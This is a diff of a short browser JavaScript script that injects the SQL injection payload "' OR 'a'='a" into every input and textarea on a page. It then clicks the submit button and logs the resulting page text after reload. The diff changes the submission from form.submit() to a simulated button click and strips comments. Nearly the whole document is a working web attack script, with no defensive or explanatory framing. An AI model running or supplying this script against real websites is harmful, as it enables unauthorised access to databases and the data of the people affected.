@@ -1,18 +1,17 @@
 (function () {
-  // Prevent repeated execution on reload
   if (sessionStorage.getItem('sqlTested') === 'true') {
     console.log("SQL Injection already tested, logging result:");
     setTimeout(() => {
-      console.log(document.body.innerText); // ✅ Actual page content
+      console.log(document.body.innerText);
     }, 1000);
-    sessionStorage.removeItem('sqlTested'); // So future runs will work
+    sessionStorage.removeItem('sqlTested');
     return;
   }
 
   console.log("Running SQL Injection script...");
 
   const sqlPayloads = [
-    "' OR 'a'='a",  // or try "' OR 1=1 --"
+    "' OR 'a'='a"
   ];
 
   const formInputs = document.querySelectorAll('input, textarea');
@@ -21,12 +20,17 @@
     console.log(`Injected into: ${input.name || input.id}`);
   });
 
-  const form = document.querySelector('form');
-  if (form) {
-    sessionStorage.setItem('sqlTested', 'true'); // Mark that we submitted
+  // Find and click the submit button
+  const submitButton = [...document.querySelectorAll('input, button')]
+    .find(el => el.type === 'submit' || el.value?.toLowerCase() === 'submit');
+
+  if (submitButton) {
+    sessionStorage.setItem('sqlTested', 'true');
     setTimeout(() => {
-      console.log("Submitting form...");
-      form.submit();
-    }, 1000); // short delay so injection is visible
+      console.log("Clicking submit button...");
+      submitButton.click(); // Simulate user click
+    }, 1000);
+  } else {
+    console.warn("Submit button not found.");
   }
 })();
